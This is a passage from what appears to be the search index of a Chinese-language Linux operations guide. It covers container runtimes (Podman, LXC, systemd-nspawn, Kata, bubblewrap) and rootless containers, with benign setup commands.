\u200b\u4f1a\u200b\u5b9a\u671f\u200b\u6267\u884c\u200b\u8fd9\u4e2a\u200b\u547d\u4ee4\u200b\uff0c\u200b\u6839\u636e\u200b\u8fd4\u56de\u503c\u200b\u5224\u65ad\u200b\u5bb9\u5668\u200b\u662f\u5426\u200b\u300c\u200b\u5065\u5eb7\u200b\u300d\u3002</p> <p>\u200b\u5c1d\u8bd5\u200b\u7f16\u5199\u200b\u4e00\u4e2a\u200b compose \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u4e00\u4e2a\u200b\u6570\u636e\u5e93\u200b\uff08\u200b\u4f60\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u5b9a\u4e49\u200b health check \u200b\u547d\u4ee4\u200b\uff09\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5bb9\u5668\u200b\u9700\u8981\u200b\u5728\u200b\u6570\u636e\u5e93\u200b\u51c6\u5907\u200b\u597d\u200b\u4e4b\u540e\u200b\u624d\u80fd\u200b\u542f\u52a8\u200b\u3002</p>"},{"location":"ops/virtualization/container/#container-runtime","title":"\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6","text":"<p>Docker \u200b\u4e0d\u662f\u200b\u552f\u4e00\u200b\u7684\u200b\u5bb9\u5668\u200b\u5b9e\u73b0\u200b\u3002OCI\uff08Open Container Initiative\uff09\u200b\u662f\u200b Linux Foundation \u200b\u7684\u200b\u9879\u76ee\u200b\uff0c\u200b\u59cb\u4e8e\u200b 2015 \u200b\u5e74\u200b\uff0c\u200b\u76ee\u6807\u200b\u662f\u200b\u4e3a\u200b\u5bb9\u5668\u200b\u6280\u672f\u200b\u5236\u5b9a\u200b\u5f00\u653e\u200b\u6807\u51c6\u200b\u3002\u200b\u76ee\u524d\u200b\u6709\u200b\u4e09\u4e2a\u200b\u6807\u51c6\u200b\uff1a</p> <ul> <li>Runtime Specification\uff1a\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6\u200b\u89c4\u8303\u200b\uff0crunc \u200b\u662f\u200b\u5176\u200b\u53c2\u8003\u200b\u5b9e\u73b0\u200b\u3002\u200b\u4e0a\u6587\u200b\u7684\u200b Docker \u200b\u4f7f\u7528\u200b containerd \u200b\u64cd\u4f5c\u200b runc \u200b\u6765\u200b\u8fd0\u884c\u200b\u5bb9\u5668\u200b\u3002</li> <li>Image Specification\uff1a\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u89c4\u8303\u200b\uff0cDocker \u200b\u7684\u200b\u955c\u50cf\u200b\u683c\u5f0f\u200b\u4e0e\u200b\u4e4b\u200b\u517c\u5bb9\u200b\u3002</li> <li>Distribution Specification\uff1a\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u5206\u53d1\u200b\u89c4\u8303\u200b\uff0c\u200b\u8fd9\u200b\u548c\u200b registry \u200b\u6709\u5173\u200b\u3002</li> </ul> <p>\u200b\u8fd9\u200b\u4e00\u90e8\u5206\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b\u5176\u4ed6\u200b\u7684\u200b\u8fd0\u884c\u200b\u65f6\u200b\u3002</p>"},{"location":"ops/virtualization/container/#podman","title":"Podman","text":"<p>Podman \u200b\u662f\u200b\u7ea2\u5e3d\u200b\u4e3b\u63a8\u200b\u7684\u200b\u5bb9\u5668\u200b\u65b9\u6848\u200b\uff0c\u200b\u5728\u200b Fedora \u200b\u548c\u200b RHEL \u200b\u4e0a\u200b\u81ea\u5e26\u200b\u3002\u200b\u76f8\u6bd4\u200b\u4e8e\u200b Docker\uff0c\u200b\u5176\u200b\u6700\u200b\u4e3b\u8981\u200b\u7684\u200b\u7279\u70b9\u200b\u662f\u200b\uff0c\u200b\u6ca1\u6709\u200b daemon\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\u4e0a\u200b\u548c\u200b Docker \u200b\u6709\u200b\u663e\u8457\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>Podman \u200b\u4f7f\u7528\u200b rootless container \u200b\u7684\u200b\u65b9\u5f0f\u200b\u8ba9\u200b\u666e\u901a\u7528\u6237\u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u50cf\u200b Docker \u200b\u90a3\u6837\u200b\u9700\u8981\u200b\u5411\u200b\u7528\u6237\u200b\u6388\u4e88\u200b\u4e0e\u200b root \u200b\u7b49\u4ef7\u200b\u7684\u200b\u6743\u9650\u200b\u3002</li> <li>\u200b\u7531\u4e8e\u200b Podman \u200b\u6ca1\u6709\u200b daemon\uff0c\u200b\u56e0\u6b64\u200b\u8bbe\u7f6e\u200b\u5bb9\u5668\u200b\u81ea\u52a8\u200b\u542f\u52a8\u200b\u7b49\u200b\u4f9d\u8d56\u4e8e\u200b systemd \u200b\u7684\u200b\u7528\u6237\u670d\u52a1\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002</li> </ul> <p>Podman \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e0e\u200b Docker \u200b\u517c\u5bb9\u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u5de5\u5177\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u4e00\u4e9b\u200b\u7ec6\u8282\u200b\u8bbe\u7f6e\u200b\u4e0a\u200b\u4ecd\u7136\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e0d\u540c\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p>"},{"location":"ops/virtualization/container/#lxc","title":"LXC","text":"<p>LXC \u200b\u662f\u200b\u4e00\u4e2a\u200b low level \u200b\u7684\u200b\u5bb9\u5668\u200b\u5de5\u5177\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5e95\u5c42\u200b\u7684\u200b API \u200b\u4e0e\u200b\u547d\u4ee4\u884c\u200b\u5de5\u5177\u200b\u3002\u200b\u5728\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u4e2d\u200b\uff0c\u200b\u7528\u6237\u200b\u4e00\u822c\u200b\u4e0d\u4f1a\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b LXC \u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u800c\u662f\u200b\u4f7f\u7528\u200b LXC \u200b\u7684\u200b\u9ad8\u5c42\u6b21\u200b\u5c01\u88c5\u200b\u5de5\u5177\u200b\uff1b\u200b\u5f00\u53d1\u8005\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u57fa\u4e8e\u200b LXC \u200b\u81ea\u884c\u200b\u5f00\u53d1\u5de5\u5177\u200b\u3002Proxmox VE \u200b\u7684\u200b\u5bb9\u5668\u200b\u652f\u6301\u200b\u5c31\u662f\u200b\u57fa\u4e8e\u200b LXC \u200b\u7684\u200b\u5c01\u88c5\u200b\uff0c\u200b\u800c\u200b LXD \u200b\u5219\u200b\u662f\u200b Canonical \u200b\u5f00\u53d1\u200b\u7684\u200b\u57fa\u4e8e\u200b LXC \u200b\u7684\u200b\u5de5\u5177\u200b\u3002</p> <p>\u200b\u7531\u4e8e\u200b\u5728\u200b 2023 \u200b\u5e74\u200b\uff0cCanonical \u200b\u5c06\u200b LXD \u200b\u4ece\u200b Linux Containers \u200b\u9879\u76ee\u200b\u4e2d\u200b\u5206\u79bb\u51fa\u6765\u200b\uff0c\u200b\u56e0\u6b64\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u793e\u533a\u200b fork Incus\u3002\u200b\u4ee5\u4e0a\u200b\u5de5\u5177\u200b\u76f8\u6bd4\u200b\u4e8e\u200b Docker \u200b\u66f4\u52a0\u200b\u6ce8\u91cd\u200b\u4e8e\u200b\u7cfb\u7edf\u200b\u7ea7\u200b\u7684\u200b\u5bb9\u5668\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u5e94\u7528\u200b\u7ea7\u200b\u7684\u200b\u5bb9\u5668\u200b\u3002</p>"},{"location":"ops/virtualization/container/#systemd-nspawn","title":"Systemd-nspawn","text":"<p>Systemd-nspawn \u200b\u662f\u200b\u7531\u200b systemd \u200b\u63d0\u4f9b\u200b\u7684\u200b\u8f7b\u91cf\u7ea7\u200b\u5bb9\u5668\u200b\u5de5\u5177\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e0e\u200b systemd \u200b\u7684\u200b\u96c6\u6210\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u4f7f\u7528\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u5176\u4e2d\u200b\u521d\u59cb\u5316\u200b\u4e86\u200b\u4e00\u4e2a\u200b Debian Bookworm \u200b\u7684\u200b rootfs\uff0c\u200b\u5e76\u4e14\u200b\u542f\u52a8\u200b\u4e86\u200b\u8fd9\u4e2a\u200b \"Debian\"\uff1a</p> <pre><code>$ sudo debootstrap bookworm debian https://mirrors.ustc.edu.cn/debian\nW: Cannot check Release signature; keyring file not available /usr/share/keyrings/debian-archive-keyring.gpg\nI: Retrieving InRelease\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n$ cd debian\n$ # \u200b\u7531\u4e8e\u200b debootstrap \u200b\u521b\u5efa\u200b\u7684\u200b root \u200b\u6ca1\u6709\u200b\u5bc6\u7801\u200b\uff0c\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b\u5bc6\u7801\u200b\n$ sudo systemd-nspawn passwd root\nSpawning container debian on /home/taoky/tmp/debian/debian.\nPress Ctrl-] three times within 1s to kill container.\nNew password:\nRetype new password:\npasswd: password updated successfully\nContainer debian exited successfully.\n$ # \u200b\u5f15\u5bfc\u200b\u5bb9\u5668\u200b\n$ sudo systemd-nspawn --boot .\nSpawning container debian on /home/taoky/tmp/debian/debian.\nPress Ctrl-] three times within 1s to kill container.\nsystemd 252.22-1~deb12u1 running in system mode (+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT -GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 -PWQUALITY +P11KIT +QRENCODE +TPM2 +BZIP2 +LZ4 +XZ +ZLIB +ZSTD -BPF_FRAMEWORK -XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified)\nDetected virtualization systemd-nspawn.\nDetected architecture x86-64.\n\nWelcome to Debian GNU/Linux 12 (bookworm)!\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre>"},{"location":"ops/virtualization/container/#vm-based-container","title":"\u57fa\u4e8e\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u5bb9\u5668\u200b\u6280\u672f","text":"<p>\u200b\u5728\u200b\u6211\u4eec\u200b\u7684\u200b\u5370\u8c61\u200b\u4e2d\u200b\uff0c\u200b\u5bb9\u5668\u200b\u603b\u662f\u200b\u6bd4\u200b\u865a\u62df\u673a\u200b\uff08hypervisor\uff09\u200b\u66f4\u200b\u8f7b\u91cf\u7ea7\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bf9\u200b\u5b89\u5168\u200b\u8981\u6c42\u200b\u4e25\u82db\u200b\u7684\u200b\u573a\u5408\u200b\u4e0b\u200b\uff0c\u200b\u5bb9\u5668\u200b\u6240\u200b\u4f9d\u8d56\u200b\u7684\u200b TCB\uff08Trusted Computing Base\uff09\u200b\u4ecd\u7136\u200b\u592a\u5927\u200b\u4e86\u200b\uff1a\u200b\u4f60\u200b\u9700\u8981\u200b\u76f8\u4fe1\u200b\u6574\u4e2a\u200b kernel \u200b\u4e0e\u200b\u5bb9\u5668\u200b\u5b9e\u73b0\u200b\u76f8\u5173\u200b\u7684\u200b\u90e8\u5206\u200b\u90fd\u200b\u6ca1\u6709\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u800c\u200b KVM \u200b\u7b49\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u7684\u200b TCB \u200b\u5c31\u200b\u5c0f\u200b\u5f88\u591a\u200b\uff0c\u200b\u51fa\u73b0\u200b\u6f0f\u6d1e\u200b\u95ee\u9898\u200b\u7684\u200b\u53ef\u80fd\u6027\u200b\u66f4\u200b\u5c0f\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u662f\u5426\u200b\u6709\u200b\u529e\u6cd5\u200b\u7ed3\u5408\u200b\u4e24\u8005\u200b\u7684\u200b\u4f18\u52bf\u200b\u5462\u200b\uff1fSOSP 17 \u200b\u7684\u200b\u8bba\u6587\u200b My VM is Lighter (and Safer) than your Container \u200b\u5b9e\u9a8c\u200b\u8bc1\u660e\u200b\u4e86\u200b\uff0c\u200b\u5982\u679c\u200b\u6574\u4e2a\u200b\u865a\u62df\u5316\u200b stack \u200b\u8db3\u591f\u200b\u7cbe\u7b80\u200b\uff0c\u200b\u90a3\u4e48\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u5f00\u9500\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u975e\u5e38\u4f4e\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u65e2\u200b\u8f7b\u91cf\u200b\u53c8\u200b\u5b89\u5168\u200b\u7684\u200b\u76ee\u6807\u200b\u3002</p> <p>Kata Containers \u200b\u5c31\u662f\u200b\u8fd9\u6837\u200b\u4e00\u4e2a\u200b\u4ee5\u200b\u865a\u62df\u673a\u200b\u4f5c\u4e3a\u200b\u5bb9\u5668\u200b\u7684\u200b\u65b9\u6848\u200b\u3002\u200b\u5b83\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u5bf9\u200b OCI \u200b\u7684\u200b\u517c\u5bb9\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5bb9\u5668\u200b\u5b9e\u73b0\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Kata \u200b\u4f5c\u4e3a\u200b\u8fd0\u884c\u200b\u65f6\u200b\uff0c\u200b\u4f8b\u5982\u200b Docker \u200b\u5c31\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5bf9\u200b\u5305\u62ec\u200b Kata \u200b\u5728\u5185\u200b\u7684\u200b\u7b2c\u4e09\u65b9\u200b\u8fd0\u884c\u200b\u65f6\u200b\u7684\u200b\u652f\u6301\u200b\u3002\u200b\u7531\u200b Amazon \u200b\u5f00\u53d1\u200b\u7684\u200b Firecracker \u200b\u4e5f\u200b\u662f\u200b\u8f7b\u91cf\u7ea7\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u65b9\u6848\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e0e\u200b containerd \u200b\u7684\u200b\u96c6\u6210\u200b\u3002</p>"},{"location":"ops/virtualization/container/#container-sandbox","title":"\u57fa\u4e8e\u200b\u5bb9\u5668\u200b\u6280\u672f\u200b\u7684\u200b\u6c99\u76d2","text":"<p>\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b\u7684\u200b\u300c\u200b\u6c99\u76d2\u200b\u300d\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u7b26\u5408\u200b OCI \u200b\u6807\u51c6\u200b\uff0c\u200b\u4f46\u662f\u200b\u5176\u200b\u4e5f\u200b\u4f7f\u7528\u200b\u4e86\u200b\u4e0e\u200b\u5bb9\u5668\u200b\u76f8\u540c\u200b\u7684\u200b\u5185\u6838\u200b\u6280\u672f\u200b\u3002</p> <p>Bubblewrap \u200b\u662f\u200b\u76ee\u524d\u200b\u76f8\u5bf9\u200b\u5e38\u7528\u200b\u7684\u200b\u5e95\u5c42\u200b\u6c99\u76d2\u200b\u5de5\u5177\u200b\u4e4b\u4e00\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5141\u8bb8\u200b\u975e\u200b root \u200b\u7528\u6237\u200b\u4f7f\u7528\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4f7f\u7528\u200b bubblewrap \u200b\u521b\u5efa\u200b shell \u200b\u6c99\u76d2\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>set -euo pipefail\n(exec bwrap --ro-bind /usr /usr \\\n      --dir /tmp \\\n      --dir /var \\\n      --symlink ../tmp var/tmp \\\n      --proc /proc \\\n      --dev /dev \\\n      --ro-bind /etc/resolv.conf /etc/resolv.conf \\\n      --symlink usr/lib /lib \\\n      --symlink usr/lib64 /lib64 \\\n      --symlink usr/bin /bin \\\n      --symlink usr/sbin /sbin \\\n      --chdir / \\\n      --unshare-all \\\n      --share-net \\\n      --die-with-parent \\\n      --dir /run/user/$(id -u) \\\n      --setenv XDG_RUNTIME_DIR \"/run/user/`id -u`\" \\\n      --setenv PS1 \"bwrap-demo$ \" \\\n      --file 11 /etc/passwd \\\n      --file 12 /etc/group \\\n      /bin/sh) \\\n    11&lt; &lt;(getent passwd $UID 65534) \\\n    12&lt; &lt;(getent group $(id -g) 65534)\n</code></pre> <p>\u200b\u8fd9\u4e2a\u200b\u300c\u200b\u6c99\u76d2\u200b\u300d\u200b\u53ea\u8bfb\u200b\u7ed1\u5b9a\u200b\u4e86\u200b\u4e3b\u673a\u200b\u7684\u200b <code>/usr</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5904\u7406\u200b\u4e86\u200b\u4e00\u4e9b\u200b <code>/etc</code> \u200b\u4e0b\u200b\u7684\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u5728\u5b9e\u8df5\u4e2d\u200b\uff0c\u200b\u66f4\u200b\u5e38\u89c1\u200b\u7684\u200b\u9762\u5411\u7528\u6237\u200b\u7684\u200b\u65b9\u6848\u200b\u6709\u200b Flatpak \u200b\u548c\u200b Snap \u200b\u7b49\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u65b9\u6848\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5e94\u7528\u200b\u6c99\u76d2\u200b\u4e0e\u200b\u5e94\u7528\u200b\u5546\u5e97\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u5b83\u4eec\u200b\u7684\u200b\u5546\u5e97\u200b\u4e2d\u200b\u5b89\u88c5\u200b\u5e94\u7528\u200b\uff0c\u200b\u800c\u200b\u8fd9\u4e9b\u200b\u5e94\u7528\u200b\u4f1a\u200b\u6839\u636e\u200b\u5177\u4f53\u200b\u7684\u200b\u9700\u6c42\u200b\u4ee5\u200b\u4e0d\u540c\u200b\u7684\u200b\u914d\u7f6e\u200b\u9694\u79bb\u200b\u5728\u200b\u6c99\u76d2\u200b\u4e2d\u200b\uff1b\u200b\u800c\u200b\u5f00\u53d1\u8005\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b\u516c\u7528\u200b\u7684\u200b\u300c\u200b\u8fd0\u884c\u200b\u65f6\u200b\u300d\u200b\u4e0a\u200b\u5f00\u53d1\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u81ea\u5df1\u200b\u7684\u200b\u5e94\u7528\u200b\u80fd\u591f\u200b\u8de8\u200b\u53d1\u884c\u7248\u200b\u987a\u5229\u200b\u8fd0\u884c\u200b\u3002</p> <p>\u200b\u8fd1\u5e74\u6765\u200b\uff0cLinux \u200b\u684c\u9762\u200b\u793e\u533a\u200b\u4e5f\u200b\u5728\u200b\u63a8\u52a8\u200b\u684c\u9762\u200b\u5e94\u7528\u200b\u7684\u200b\u6c99\u76d2\u5316\u200b\uff0c\u200b\u5176\u4e2d\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b XDG Desktop Portal\u3002Portal \u200b\u7684\u200b\u4e00\u4e2a\u200b\u4ee3\u8868\u6027\u200b\u4f8b\u5b50\u200b\u662f\u200b\uff0c\u200b\u5e94\u7528\u200b\u9700\u8981\u200b\u663e\u793a\u6587\u4ef6\u200b\u9009\u62e9\u200b\u5bf9\u8bdd\u6846\u200b\u65f6\u200b\uff0c\u200b\u4e0d\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u800c\u662f\u200b\u901a\u8fc7\u200b Portal \u200b\u8bf7\u6c42\u200b\u6587\u4ef6\u200b\u9009\u62e9\u5668\u200b\uff0cPortal \u200b\u4f1a\u5f39\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u9009\u62e9\u5668\u200b\u7684\u200b\u7a97\u53e3\u200b\uff0c\u200b\u7528\u6237\u200b\u9009\u62e9\u200b\u6587\u4ef6\u200b\u540e\u200b\uff0cPortal \u200b\u4f1a\u200b\u5c06\u200b\u6587\u4ef6\u200b\u7684\u200b\u8def\u5f84\u200b\u4f20\u9012\u200b\u7ed9\u200b\u5e94\u7528\u200b\u3002\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\uff0c\u200b\u5e94\u7528\u200b\u4e0d\u200b\u9700\u8981\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u800c\u662f\u200b\u901a\u8fc7\u200b Portal \u200b\u4e0e\u200b\u7528\u6237\u200b\u4ea4\u4e92\u200b\uff0cPortal \u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u7528\u6237\u200b\u7684\u200b\u9009\u62e9\u200b\u6765\u200b\u9650\u5236\u200b\u5e94\u7528\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\u3002</p>"},{"location":"ops/virtualization/container/#rootless-container","title":"Rootless \u200b\u5bb9\u5668","text":"<p>\u200b\u5728\u200b Docker \u200b\u90e8\u5206\u200b\uff0c\u200b\u6211\u4eec\u200b\u63d0\u5230\u200b\u5c06\u200b\u7528\u6237\u200b\u52a0\u5165\u200b <code>docker</code> \u200b\u7ec4\u5c31\u200b\u76f8\u5f53\u4e8e\u200b\u7ed9\u4e88\u200b\u4e86\u200b\u7528\u6237\u200b root \u200b\u6743\u9650\u200b\uff0c\u200b\u800c\u200b\u4f20\u7edf\u200b\u7684\u200b\u57fa\u4e8e\u200b SUID \u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5982\u679c\u200b SUID \u200b\u7a0b\u5e8f\u200b\u5b58\u5728\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e5f\u200b\u5f88\u200b\u5bb9\u6613\u200b\u88ab\u200b\u5229\u7528\u200b\u63d0\u6743\u200b\u3002\u200b\u90a3\u4e48\u200b\u662f\u5426\u200b\u6709\u200b\u529e\u6cd5\u200b\u8ba9\u200b\u666e\u901a\u7528\u6237\u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u4ea7\u751f\u200b\u8fd9\u6837\u200b\u7684\u200b\u5b89\u5168\u200b\u98ce\u9669\u200b\u5462\u200b\uff1fRootless \u200b\u5bb9\u5668\u200b\u57fa\u4e8e\u200b\u975e\u200b\u7279\u6743\u200b user namespace \u200b\u6280\u672f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u666e\u901a\u7528\u6237\u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b root \u200b\u6743\u9650\u200b\u3002\u200b\u5728\u200b\u8fd9\u6837\u200b\u7684\u200b\u5bb9\u5668\u200b\u4e2d\u200b\uff0c\u200b\u7528\u6237\u200b\u300c\u200b\u770b\u8d77\u6765\u200b\u300d\u200b\u83b7\u5f97\u200b\u4e86\u200b root \u200b\u6743\u9650\u200b\uff0c\u200b\u5e76\u4e14\u200b\u80fd\u591f\u200b\u5728\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u505a\u200b root \u200b\u80fd\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b9e\u9645\u4e0a\u200b\u5bb9\u5668\u200b\u5185\u200b\u7684\u200b root \u200b\u7528\u6237\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b\u5bbf\u4e3b\u673a\u200b\u4e0a\u200b\u7684\u200b\u4e00\u4e2a\u200b\u666e\u901a\u7528\u6237\u200b\u3002</p> <p>Docker \u200b\u4e0e\u200b Podman \u200b\u5747\u200b\u652f\u6301\u200b rootless \u200b\u5bb9\u5668\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5206\u522b\u200b\u53c2\u8003\u200b\u5bf9\u5e94\u200b\u7684\u200b\u914d\u7f6e\u200b\u6587\u6863\u200b\uff08Docker\u3001Podman\uff09\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u975e\u200b\u7279\u6743\u200b user namespace \u200b\u7684\u200b\u5b89\u5168\u6027\u200b\u4e5f\u200b\u5b58\u5728\u200b\u4e89\u8bae\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u8f83\u200b\u65b0\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u4e00\u822c\u200b\u90fd\u200b\u9ed8\u8ba4\u200b\u5f00\u542f\u200b\u4e86\u200b\u975e\u200b\u7279\u6743\u200b user namespace\uff0c\u200b\u4f46\u662f\u200b\u6709\u200b\u89c2\u70b9\u200b\u8ba4\u4e3a\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u9879\u200b\u7279\u6027\u200b\u5728\u200b\u5185\u6838\u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4ecd\u7136\u200b\u6709\u200b\u8f83\u200b\u591a\u200b\uff08\u200b\u672a\u200b\u53d1\u73b0\u200b\uff09\u200b\u7684\u200b\u5b89\u5168\u6f0f\u6d1e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u5b89\u5168\u6027\u200b\u8981\u6c42\u200b\u8f83\u200b\u9ad8\u200b\u7684\u200b\u573a\u5408\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8c28\u614e\u200b\u4f7f\u7528\u200b\u3002</p> <p>Rootless \u200b\u5bb9\u5668\u200b\u4e0e\u200b\u5b89\u5168\u200b\u7684\u200b Docker-in-Docker \u200b\u8bbe\u8ba1\u200b</p> <p>\u200b\u5728\u200b\u4e00\u4e9b\u200b\u573a\u5408\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u5f97\u4e0d\u200b\u5c06\u200b Docker socket \u200b\u66b4\u9732\u200b\u7ed9\u200b\u4e00\u4e9b\u200b\u670d\u52a1\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u5e0c\u671b\u200b\u5373\u4f7f\u200b\u670d\u52a1\u200b\u7684\u200b\u5b89\u5168\u200b\u8fb9\u754c\u200b\u88ab\u200b\u653b\u7834\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u83b7\u5f97\u200b\u4e86\u200b Docker socket \u200b\u7684\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\uff0c\u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u5f71\u54cd\u200b\u5bbf\u4e3b\u673a\u200b\u3002\u200b\u6b64\u65f6\u200b Rootless \u200b\u7684\u200b Docker-in-Docker\uff08DinD\uff09\u200b\u5c31\u662f\u200b\u4e00\u79cd\u200b\u89e3\u51b3\u65b9\u6848\u200b\u3002\u200b\u8be6\u60c5\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b LUG Planet \u200b\u7684\u200b\u300cRootless Docker in Docker \u200b\u5728\u200b Hackergame \u200b\u4e2d\u200b\u7684\u200b\u5b9e\u8df5\u200b\u300d\u200b\u4e00\u6587\u200b\u4e86\u89e3\u200b\u3002</p> <ol> <li> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u6587\u6863\u200b\u4e2d\u200b\u7684\u200b 2001:db8:1::/64 \u200b\u8fd9\u4e2a\u200b\u5730\u5740\u200b\u96b6\u5c5e\u4e8e\u200b 2001:db8::/32 \u200b\u8fd9\u4e2a\u200b\u4e13\u95e8\u200b\u7528\u4e8e\u200b\u6587\u6863\u200b\u548c\u200b\u6837\u4f8b\u200b\u4ee3\u7801\u200b\u7684\u200b\u5730\u5740\u200b\u6bb5\u200b\uff08\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b example.com \u200b\u7684\u200b\u529f\u80fd\u200b\uff09\uff0c\u200b\u4e0d\u80fd\u200b\u7528\u4e8e\u200b\u5b9e\u9645\u200b\u7684\u200b\u7f51\u7edc\u200b\u914d\u7f6e\u200b\u3002\u00a0\u21a9</p> </li> </ol>"},{"location":"ops/virtualization/intro/","title":"\u57fa\u7840\u77e5\u8bc6\u200b\u7b80\u4ecb","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@Crabtux</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> 